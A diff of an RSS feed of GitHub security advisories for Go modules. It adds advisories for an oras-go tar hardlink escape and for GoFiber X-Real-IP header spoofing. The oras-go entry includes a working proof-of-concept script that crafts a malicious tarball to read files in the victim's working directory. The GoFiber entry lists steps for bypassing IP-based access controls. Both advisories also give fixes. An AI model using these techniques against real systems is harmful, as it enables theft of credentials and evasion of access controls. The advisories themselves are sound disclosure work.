@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://azu.github.io/github-advisory-database-rss/go.rss</id>
     <title>Security Advisory for Go modules</title>
-    <updated>2026-08-04T20:16:30.166Z</updated>
+    <updated>2026-08-04T22:02:11.096Z</updated>
     <generator>github-advisory-database-rss</generator>
     <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago"/>
     <subtitle>Security Advisory for Go modules on GitHub</subtitle>
@@ -11,6 +11,256 @@
     <category term="HIGH"/>
     <category term="MODERATE"/>
     <category term="LOW"/>
+    <entry>
+        <title type="html"><![CDATA[[oras.land/oras-go/v2] `oras-go` tar extraction: Hardlink entry with relative Linkname escapes extract dir via process CWD resolution]]></title>
+        <id>https://github.com/advisories/GHSA-fxhp-mv3v-67qp</id>
+        <link href="https://github.com/advisories/GHSA-fxhp-mv3v-67qp"/>
+        <updated>2026-08-04T21:53:18.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="root-cause">Root cause</h3>
+<p>The tar-extraction helper <code>ensureLinkPath</code> at <a href="https://github.com/oras-project/oras-go/blob/main/content/file/utils.go#L262-L275"><code>content/file/utils.go:262-275</code></a> validates that a hardlink's target resolves inside the extract base, but then returns the original unresolved <code>target</code> string back to the caller:</p>
+<pre><code class="language-go">func ensureLinkPath(baseAbs, baseRel, link, target string) (string, error) {
+    path := target
+    if !filepath.IsAbs(target) {
+        path = filepath.Join(filepath.Dir(link), target)  // resolved FOR VALIDATION
+    }
+    if _, err := resolveRelToBase(baseAbs, baseRel, path); err != nil {
+        return "", err
+    }
+    return target, nil   // &lt;-- returns the ORIGINAL target, not the validated path
+}
+</code></pre>
+<p>The caller for <code>TypeLink</code> hardlinks then does:</p>
+<pre><code class="language-go">case tar.TypeLink:
+    var target string
+    if target, err = ensureLinkPath(dirPath, dirName, filePath, header.Linkname); err == nil {
+        err = os.Link(target, filePath)
+    }
+</code></pre>
+<p><code>os.Link(oldname, newname)</code> wraps the <code>link(2)</code> system call. From the <code>link(2)</code> man page:</p>
+<blockquote>
+<p>oldpath and newpath are interpreted relative to the current working directory of the calling process.</p>
+</blockquote>
+<p>So when <code>target</code> (i.e., <code>header.Linkname</code>) is a <strong>relative</strong> path, <code>os.Link</code> resolves it against the process's <strong>current working directory</strong>, not against <code>filepath.Dir(link)</code> as the validation assumed.</p>
+<h3 id="attack">Attack</h3>
+<p>An attacker who controls an OCI-compliant registry (or any artifact source the victim consumes via <code>oras pull</code>) crafts a tarball layer with:</p>
+<ul>
+<li>A regular file: <code>payload.tar.gz/README.txt</code>.</li>
+<li>A hardlink entry: <code>Typeflag=TypeLink</code>, <code>Name=payload.tar.gz/evil_cwd_link</code>, <code>Linkname="victim.secret"</code> (relative).</li>
+</ul>
+<p>and marks the layer descriptor with <code>io.deis.oras.content.unpack: "true"</code> (a standard annotation that tells <code>oras-go</code> to auto-extract).</p>
+<p>When a victim runs <code>oras pull</code> (or any Go code using <code>content.File</code>), the extraction:</p>
+<ol>
+<li>Validates <code>payload.tar.gz/evil_cwd_link</code> — passes.</li>
+<li>Calls <code>ensureLinkPath(dirPath, "payload.tar.gz", filePath, "victim.secret")</code>:<ul>
+<li><code>path = filepath.Join(filepath.Dir(filePath), "victim.secret")</code> = <code>&lt;extract_base&gt;/payload.tar.gz/victim.secret</code> → inside base → <strong>validation passes</strong>.</li>
+<li>Returns <code>target = "victim.secret"</code> (NOT <code>path</code>).</li>
+</ul>
+</li>
+<li>Calls <code>os.Link("victim.secret", "&lt;extract_base&gt;/payload.tar.gz/evil_cwd_link")</code>.</li>
+<li><code>link(2)</code> resolves relative <code>oldname="victim.secret"</code> against process CWD → creates a hardlink inside the extract tree pointing to <code>&lt;invoker_CWD&gt;/victim.secret</code>.</li>
+</ol>
+<p>The resulting hardlink and the CWD file <strong>share an inode</strong> — reading one reads the other; writing to one writes to the other.</p>
+<hr>
+<h2 id="proof-of-concept">Proof of Concept</h2>
+<p>Tested on Ubuntu 24.04.4 LTS with <code>oras</code> CLI v1.3.0 (SHA-256 <code>040e140304b7dbdd9b40dacd798e2303cea44ad84eeb210750afdf15f1dcf8b4</code>, downloaded from <a href="https://github.com/oras-project/oras/releases/download/v1.3.0/oras_1.3.0_linux_amd64.tar.gz">https://github.com/oras-project/oras/releases/download/v1.3.0/oras_1.3.0_linux_amd64.tar.gz</a>).</p>
+<p>Reproduction script (standalone, ~50 lines) attached. Summary of key steps:</p>
+<pre><code class="language-bash"># 1. Place victim file in the future CWD.
+mkdir -p cwd-space extract
+echo "TOP SECRET FROM CWD" &gt; cwd-space/victim.secret
+
+# 2. Craft malicious tarball with a TypeLink entry whose Linkname is RELATIVE.
+python3 -c '
+import tarfile, io, os
+with tarfile.open("cwd-space/payload.tar.gz", "w:gz", format=tarfile.GNU_FORMAT) as t:
+    info = tarfile.TarInfo(name="payload.tar.gz/README.txt")
+    c = b"pulled from registry"; info.size = len(c); info.mode = 0o644
+    info.uid = os.getuid(); info.gid = os.getgid()
+    t.addfile(info, io.BytesIO(c))
+
+    link = tarfile.TarInfo(name="payload.tar.gz/evil_cwd_link")
+    link.type = tarfile.LNKTYPE
+    link.linkname = "victim.secret"   # RELATIVE
+    link.mode = 0o644; link.uid = os.getuid(); link.gid = os.getgid()
+    t.addfile(link)
+'
+
+# 3. Push to OCI layout, patch in the unpack annotation, pull from cwd-space.
+(cd cwd-space &amp;&amp; oras push --oci-layout ../layout:v1 \
+    payload.tar.gz:application/vnd.oci.image.layer.v1.tar+gzip)
+# ... patch layout/blobs/sha256/&lt;manifest&gt; to add
+#     io.deis.oras.content.unpack: "true" on layers[0].annotations ...
+
+(cd cwd-space &amp;&amp; oras pull --oci-layout ../layout:v1 --output ../extract)
+
+# 4. Observe inode sharing.
+stat -c '%i' extract/payload.tar.gz/evil_cwd_link   # → 6554160
+stat -c '%i' cwd-space/victim.secret                # → 6554160 (SAME)
+cat extract/payload.tar.gz/evil_cwd_link             # → "TOP SECRET FROM CWD"
+</code></pre>
+<p>Observed output:</p>
+<pre><code>evil_cwd_link (inside extract dir): inode=6554160
+victim.secret  (in invoker CWD):    inode=6554160
+*** ESCAPE CONFIRMED ***
+Reading through the extract-dir hardlink yields the CWD file contents:
+TOP SECRET FROM CWD
+</code></pre>
+<p>A library-level regression test is also provided (<code>poc_test.go</code>) that drops into <code>content/file/utils_test.go</code> and runs via <code>go test ./content/file/... -run TestPoC</code> — output shows identical inode match for consumers of the library API.</p>
+<hr>
+<h2 id="impact">Impact</h2>
+<p><strong>Primary: arbitrary-CWD-file read primitive.</strong> An attacker-controlled OCI artifact, when pulled by a victim using the <code>oras</code> CLI or any Go program using <code>oras-go/v2/content/file</code>, can create a hardlink inside the victim's extract tree pointing to an arbitrary file in the victim's process CWD (that the invoker UID is permitted to read). Reading the extract-tree hardlink yields that file's contents verbatim.</p>
+<p><strong>Secondary: inode-sharing tampering primitive.</strong> Any tool that later modifies the extract-tree hardlink (write, chmod, truncate, etc.) modifies the CWD file through the shared inode. This violates the "writes inside the extract dir are confined" invariant that downstream tooling (CI systems, container-image builders, artifact scanners) typically depends on.</p>
+<p><strong>High-severity chains:</strong></p>
+<ul>
+<li><strong>CI pipelines</strong> where <code>oras pull</code> runs from a project workspace containing secrets/credentials (<code>.env</code>, <code>.git/config</code>, service-account tokens). The pulled artifact can hardlink those secrets into a location later archived/mounted/published.</li>
+<li><strong>Container orchestration</strong> where the extract dir is bind-mounted into a lower-trust container while the pull-invoker's CWD is higher-trust. Hardlinks created in the extract tree expose invoker-CWD files across the trust boundary.</li>
+<li><strong>Kubernetes operators / Flux source-controller</strong> using <code>oras-go</code> to fetch artifacts; their CWD is typically <code>/</code> or <code>/root</code> — very sensitive.</li>
+<li><strong>Multi-tenant registry proxies</strong> that use <code>oras-go</code> to fetch and re-serve artifacts; each proxy process has a CWD with configuration, keys, or per-tenant state.</li>
+</ul>
+<p><strong>Not affected:</strong></p>
+<ul>
+<li><code>oras push</code> (tarball creation side): <code>tarDirectory</code> in the same file explicitly skips hardlink generation (line 65 comment: <code>"We don't support hard links and treat it as regular files"</code>), so pushed content cannot trigger this on the server.</li>
+<li>Symlink extraction path (<code>TypeSymlink</code>): <code>os.Symlink</code> stores the target string verbatim and does not CWD-resolve at creation time. The current <code>ensureLinkPath</code> return-of-<code>target</code> is correct for symlinks (the existing validation correctly models the symlink-follow path).</li>
+</ul>
+<h3 id="attack-surface-boundary-fsprotected_hardlinks">Attack-surface boundary (<code>fs.protected_hardlinks</code>)</h3>
+<p>On Linux with <code>fs.protected_hardlinks=1</code> (default on modern distros), <code>link(2)</code> additionally requires the linking user to have READ + WRITE permission on the source file (per <code>may_linkat()</code> in the kernel). Verified on Ubuntu 24.04: as non-root, <code>ln /etc/passwd /tmp/x</code> returns <code>EPERM</code>, and the same via the oras PoC path returns <code>link passwd /tmp/.../evil_passwd: operation not permitted</code>.</p>
+<p><strong>So the attacker cannot use this bug to read arbitrary root-owned files (e.g., <code>/etc/shadow</code>) when the victim invokes <code>oras pull</code> as a regular user.</strong> The attack surface depends on the invocation context:</p>
+<table>
+<thead>
+<tr>
+<th>Invocation context</th>
+<th>Reachable file classes</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>oras pull</code> run by a regular user</td>
+<td>Any file the user OWNS or has write access to in the process CWD: <code>.env</code>, <code>.git/config</code>, <code>.aws/credentials</code>, <code>~/.ssh/config</code>, project-local secrets, CI workspace files.</td>
+</tr>
+<tr>
+<td><code>oras pull</code> run as root (systemd without <code>User=</code>, container entrypoint default root, Kubernetes operator)</td>
+<td><strong>Every file on the host filesystem.</strong> <code>/etc/shadow</code>, <code>/root/.ssh/id_rsa</code>, bind-mounted host paths, service private keys.</td>
+</tr>
+</tbody></table>
+<p>The user-context attack surface alone is sufficient for supply-chain-grade impact: CI pipelines and developer machines routinely hold API keys, signing keys, and cloud credentials in user-owned files in the working directory. The root-context escalation makes the bug Critical in mainstream Kubernetes/GitOps tooling where oras-go is adopted for artifact distribution.</p>
+<hr>
+<h2 id="proposed-fix">Proposed fix</h2>
+<p>Change <code>ensureLinkPath</code> to expose both the verbatim target (for symlinks) and the resolved absolute path (for hardlinks); have the <code>TypeLink</code> case use the resolved path.</p>
+<pre><code class="language-go">// Current behavior preserved for TypeSymlink. TypeLink switches to the resolved
+// path to avoid CWD-resolution mismatch at os.Link time.
+func ensureLinkPath(baseAbs, baseRel, link, target string) (symlinkTarget, hardlinkPath string, err error) {
+    path := target
+    if !filepath.IsAbs(target) {
+        path = filepath.Join(filepath.Dir(link), target)
+    }
+    if _, err = resolveRelToBase(baseAbs, baseRel, path); err != nil {
+        return "", "", err
+    }
+    return target, path, nil
+}
+</code></pre>
+<pre><code class="language-go">case tar.TypeLink:
+    var absTarget string
+    if _, absTarget, err = ensureLinkPath(dirPath, dirName, filePath, header.Linkname); err == nil {
+        err = os.Link(absTarget, filePath)
+    }
+case tar.TypeSymlink:
+    var symTarget string
+    symTarget, _, err = ensureLinkPath(dirPath, dirName, filePath, header.Linkname)
+    if err != nil { return err }
+    if err = os.Symlink(symTarget, filePath); err != nil { ... }
+</code></pre>
+<p><strong>Regression test to add:</strong></p>
+<p>Extend <code>Test_extractTarDirectory_HardLink</code> with a third sub-test that:</p>
+<ol>
+<li>Creates a sentinel file in the test's <code>t.TempDir()</code> (or an explicitly <code>os.Chdir</code>-entered directory) with a known name, e.g. <code>sentinel.txt</code>.</li>
+<li>Builds a tarball containing a <code>TypeLink</code> entry with <code>Linkname: "sentinel.txt"</code> (relative).</li>
+<li>Extracts.</li>
+<li>Asserts either <code>extractTarDirectory</code> returned an error, OR the resulting hardlink's inode does NOT match the sentinel's inode.</li>
+</ol>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/oras-project/oras-go/security/advisories/GHSA-fxhp-mv3v-67qp">https://github.com/oras-project/oras-go/security/advisories/GHSA-fxhp-mv3v-67qp</a></li>
+<li><a href="https://github.com/oras-project/oras-go/commit/b11f777f8d405c5023c4b307cfdc5068dfc3d406">https://github.com/oras-project/oras-go/commit/b11f777f8d405c5023c4b307cfdc5068dfc3d406</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-50163">https://nvd.nist.gov/vuln/detail/CVE-2026-50163</a></li>
+<li><a href="https://github.com/oras-project/oras-go/pull/1232">https://github.com/oras-project/oras-go/pull/1232</a></li>
+<li><a href="https://github.com/oras-project/oras-go/commit/c463c654ab3ef34422c1764cd619806cebf20451">https://github.com/oras-project/oras-go/commit/c463c654ab3ef34422c1764cd619806cebf20451</a></li>
+<li><a href="https://github.com/oras-project/oras-go/releases/tag/v2.6.2">https://github.com/oras-project/oras-go/releases/tag/v2.6.2</a></li>
+<li><a href="https://github.com/advisories/GHSA-fxhp-mv3v-67qp">https://github.com/advisories/GHSA-fxhp-mv3v-67qp</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-fxhp-mv3v-67qp</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-07-01T21:48:04.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[github.com/gofiber/fiber/v2] GoFiber Vulnerable to X-Real-IP Spoofing via Header.Add() in BalancerForward]]></title>
+        <id>https://github.com/advisories/GHSA-gcfq-8gqf-4876</id>
+        <link href="https://github.com/advisories/GHSA-gcfq-8gqf-4876"/>
+        <updated>2026-08-04T21:52:04.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
+<p>The <code>BalancerForward</code> proxy helper in GoFiber uses <code>Header.Add()</code> instead of <code>Header.Set()</code> when injecting the <code>X-Real-IP</code> header. This appends the real client IP as a second header value rather than replacing any attacker-supplied value. Upstream servers that read the first <code>X-Real-IP</code> header (nginx, Express, most HTTP servers) use the attacker's spoofed IP for logging, rate limiting, and access control.</p>
+<h2 id="vulnerable-code">Vulnerable Code</h2>
+<p><strong>File:</strong> <code>middleware/proxy/proxy.go</code>, lines 270-285</p>
+<pre><code class="language-go">func BalancerForward(servers []string, clients ...*fasthttp.Client) fiber.Handler {
+    r := &amp;roundrobin{
+        current: 0,
+        pool:    servers,
+    }
+    return func(c fiber.Ctx) error {
+        server := r.get()
+        if !strings.HasPrefix(server, "http") {
+            server = "http://" + server
+        }
+        c.Request().Header.Add("X-Real-IP", c.IP())   // line 282: Add, not Set
+        return Do(c, server+c.OriginalURL(), clients...)
+    }
+}
+</code></pre>
+<h2 id="data-flow">Data Flow</h2>
+<ol>
+<li>Attacker sends request with <code>X-Real-IP: 10.0.0.1</code> (spoofed internal IP)</li>
+<li><code>BalancerForward</code> handler executes at line 282</li>
+<li><code>c.Request().Header.Add("X-Real-IP", c.IP())</code> APPENDS the real IP as a second header</li>
+<li>Upstream server receives: <code>X-Real-IP: 10.0.0.1</code> AND <code>X-Real-IP: &lt;real-attacker-ip&gt;</code></li>
+<li>Most HTTP servers (nginx, Node.js, Apache) read the FIRST value</li>
+<li>Upstream uses <code>10.0.0.1</code> for all IP-dependent logic</li>
+</ol>
+<h2 id="impact">Impact</h2>
+<ul>
+<li><strong>Rate limit bypass:</strong> IP-based rate limiting at the upstream uses the spoofed IP, allowing unlimited requests</li>
+<li><strong>IP ACL bypass:</strong> Internal IP allowlists (e.g., admin panels restricted to <code>10.0.0.0/8</code>) can be bypassed</li>
+<li><strong>Audit log poisoning:</strong> Security logs record the spoofed IP, making incident investigation unreliable</li>
+<li><strong>Geolocation bypass:</strong> IP-based geofencing or region restrictions are circumvented</li>
+</ul>
+<h2 id="fix">Fix</h2>
+<p>Replace <code>Header.Add()</code> with <code>Header.Set()</code> at line 282:</p>
+<pre><code class="language-go">c.Request().Header.Set("X-Real-IP", c.IP())
+</code></pre>
+<p><code>Header.Set()</code> replaces any existing header value, ensuring only the real client IP is forwarded.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/gofiber/fiber/security/advisories/GHSA-gcfq-8gqf-4876">https://github.com/gofiber/fiber/security/advisories/GHSA-gcfq-8gqf-4876</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-45045">https://nvd.nist.gov/vuln/detail/CVE-2026-45045</a></li>
+<li><a href="https://github.com/gofiber/fiber/pull/4260">https://github.com/gofiber/fiber/pull/4260</a></li>
+<li><a href="https://github.com/gofiber/fiber/pull/4495">https://github.com/gofiber/fiber/pull/4495</a></li>
+<li><a href="https://github.com/gofiber/fiber/commit/1403cc8292da3220e9316960b4030cc722a0f396">https://github.com/gofiber/fiber/commit/1403cc8292da3220e9316960b4030cc722a0f396</a></li>
+<li><a href="https://github.com/gofiber/fiber/commit/33c9501288ab47a429c8b5e701493f0c3c0af37d">https://github.com/gofiber/fiber/commit/33c9501288ab47a429c8b5e701493f0c3c0af37d</a></li>
+<li><a href="https://github.com/gofiber/fiber/releases/tag/v2.52.14">https://github.com/gofiber/fiber/releases/tag/v2.52.14</a></li>
+<li><a href="https://github.com/gofiber/fiber/releases/tag/v3.3.0">https://github.com/gofiber/fiber/releases/tag/v3.3.0</a></li>
+<li><a href="https://github.com/advisories/GHSA-gcfq-8gqf-4876">https://github.com/advisories/GHSA-gcfq-8gqf-4876</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-gcfq-8gqf-4876</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-07-02T13:50:45.000Z</published>
+    </entry>
     <entry>
         <title type="html"><![CDATA[[github.com/gtsteffaniak/filebrowser/backend] FileBrowser Quantum's path traversal issue in subtitle handler allows any authenticated user to read arbitrary files]]></title>
         <id>https://github.com/advisories/GHSA-vvp7-h4fj-m28w</id>
@@ -1198,58 +1448,6 @@ Users are recommended to upgrade to version 2.0.1, which fixes the issue.</p>
             <name>GitHub</name>
             <email>GitHub@noreply.github.com</email>
             <uri>https://github.com/advisories/GHSA-x4f6-mqg6-28xx</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-06-09T09:32:07.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[github.com/apache/incubator-answer] Apache Answer has an Exposure of Private Personal Information to an Unauthorized Actor vulnerability]]></title>
-        <id>https://github.com/advisories/GHSA-w754-5646-xq9j</id>
-        <link href="https://github.com/advisories/GHSA-w754-5646-xq9j"/>
-        <updated>2026-07-30T18:31:51.000Z</updated>
-        <content type="html"><![CDATA[<p>Exposure of Private Personal Information to an Unauthorized Actor vulnerability in Apache Answer.</p>
-<p>This issue affects Apache Answer: through 2.0.0.</p>
-<p>Timeline-related APIs lacked proper authorization checks, allowing regular authenticated users to access deleted, private, or unapproved content and its revision history.
-Users are recommended to upgrade to version 2.0.1, which fixes the issue.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-25699">https://nvd.nist.gov/vuln/detail/CVE-2026-25699</a></li>
-<li><a href="https://lists.apache.org/thread/c36k4hzwhncqo0qfn5fg57f1gkjhyfv8">https://lists.apache.org/thread/c36k4hzwhncqo0qfn5fg57f1gkjhyfv8</a></li>
-<li><a href="http://www.openwall.com/lists/oss-security/2026/06/09/6">http://www.openwall.com/lists/oss-security/2026/06/09/6</a></li>
-<li><a href="https://github.com/apache/answer/commit/92994b49976b6206a7000d045d924ec4fd5be1be">https://github.com/apache/answer/commit/92994b49976b6206a7000d045d924ec4fd5be1be</a></li>
-<li><a href="https://github.com/apache/answer/releases/tag/v2.0.1">https://github.com/apache/answer/releases/tag/v2.0.1</a></li>
-<li><a href="https://github.com/advisories/GHSA-w754-5646-xq9j">https://github.com/advisories/GHSA-w754-5646-xq9j</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-w754-5646-xq9j</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-06-09T09:32:07.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[github.com/apache/incubator-answer] Apache Answer has an Improper Neutralization of Alternate XSS Syntax vulnerability]]></title>
-        <id>https://github.com/advisories/GHSA-hmr2-99jm-8x45</id>
-        <link href="https://github.com/advisories/GHSA-hmr2-99jm-8x45"/>
-        <updated>2026-07-30T16:49:26.000Z</updated>
-        <content type="html"><![CDATA[<p>Improper Neutralization of Alternate XSS Syntax vulnerability in Apache Answer.</p>
-<p>This issue affects Apache Answer: through 2.0.0.</p>
-<p>AI-generated response content was rendered in the browser without proper sanitization, allowing malicious scripts to be executed when the content was viewed.
-Users are recommended to upgrade to version 2.0.1, which fixes the issue.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-25688">https://nvd.nist.gov/vuln/detail/CVE-2026-25688</a></li>
-<li><a href="https://lists.apache.org/thread/x42joj43rqb38ms5q60f7bgq3qbo7t5q">https://lists.apache.org/thread/x42joj43rqb38ms5q60f7bgq3qbo7t5q</a></li>
-<li><a href="http://www.openwall.com/lists/oss-security/2026/06/09/7">http://www.openwall.com/lists/oss-security/2026/06/09/7</a></li>
-<li><a href="https://github.com/advisories/GHSA-hmr2-99jm-8x45">https://github.com/advisories/GHSA-hmr2-99jm-8x45</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-hmr2-99jm-8x45</uri>
         </author>
         <category label="severity" term="MODERATE"/>
         <published>2026-06-09T09:32:07.000Z</published>
